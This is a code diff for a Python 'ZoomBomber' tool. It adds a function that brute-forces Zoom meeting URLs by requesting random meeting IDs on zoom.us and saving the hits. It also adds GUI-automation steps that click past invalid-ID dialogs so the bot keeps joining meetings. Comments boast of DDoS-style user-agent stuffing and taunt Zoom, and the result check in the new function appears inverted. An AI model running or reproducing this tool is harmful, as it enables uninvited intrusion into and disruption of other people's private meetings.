@@ -7,6 +7,8 @@ import numpy as np
 from time import sleep
 from pyfiglet import Figlet
 from colorama import *
+import requests
+
 
 class ZoomBomber:
     def __init__(self):
@@ -61,6 +63,19 @@ class ZoomBomber:
         while self.enter_meeting == None:
             self.enter_meeting = pyautogui.locateOnScreen('./Enter-Meeting.png')
             print(f'Enter Meeting Status on Screen {self.enter_meeting}')
+            invalid_id = pyautogui.locateOnScreen('./Invalid_ID.png')
+            if invalid_id != None:
+
+                ok_loc_e = pyautogui.locateOnScreen('./Ok_Button.png')
+                while ok_loc_e == None:
+                    ok_loc_e = pyautogui.locateOnScreen('./Ok_Button.png')
+                pyautogui.click(ok_loc_e)
+                join_meeting_ez = pyautogui.locateOnScreen('./join-meeting.png')
+                while join_meeting_ez == None:
+                    join_meeting_ez = pyautogui.locateOnScreen('./join-meeting.png')
+                pyautogui.click(join_meeting_ez)
+
+
         pyautogui.click(self.enter_meeting)
         pyautogui.typewrite(f'{link}')
         pyautogui.press('enter')
@@ -141,7 +156,44 @@ class ZoomBomber:
 
             print('Ottoman Brute Forcer Completed Execution')
             print('Allah is the Greatest ....')
+    def Zoom_Requests_Gen(self,go_crazy=False):
+        # Took this Code from
+        os.system('cls' if os.name == 'nt' else 'clear')
 
+        # Data
+        headers = {"User-Agent": ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"]}
+        # Adding sooo many user-agents thats it too much overkitt even for a ddoser hehe
+        # Good Luck Zoomers Hehehe, Boomers Win !!!
+        # If ur from Zoom and Reading this, please forgive me, I had to do it hehe
+        # Do not be a cry baby be a Man or a Women.
+        with open('./user-agents.txt', 'r', encoding='utf8') as f:
+            data = f.read()
+        # Appending that to the headers
+        if go_crazy == True:
+            for element in data:
+                headers['User-Agent'].append(element)
+        # Brute Force Operation
+        reqSession = requests.session()
+        errorMsg = "This meeting link is invalid"
+
+        print(Fore.YELLOW + "[+] 3x0c | Zoom Meeting URL Brute Force")
+        print(Fore.YELLOW + "[+] Brute Forcing...\n\n" + Fore.RESET)
+
+        try:
+            while True:
+                meeting_id = random.randint(00000000000, 99999999999)
+                url = "https://zoom.us/wc/" + str(meeting_id) + "/start"
+                response = reqSession.get(url, data=headers)
+                # time.sleep(0.1) # Threads
+                if not errorMsg in response.text:
+                    print(Fore.RED + "[+] Bad " + url)
+                else:
+                    print(Fore.WHITE + "[+] Good " + url)
+                    with open('Zoom-Meetings.txt', 'a+') as ree:
+                        ree.write(f'{meeting_id}:unknown')
+                        return meeting_id
+        except KeyboardInterrupt:
+            print(Fore.RED + "Exiting...")
 
 
 
@@ -151,7 +203,7 @@ class ZoomBomber:
 if __name__ == '__main__':
     Bomber = ZoomBomber()
     while True:
-        Link = Bomber.generate_link()
+        Link = Bomber.generate_link(10)
         Link_Status = Bomber.check_link(Link)
         if Link_Status == True:
             print(f'[?] This Link Works {Link}')
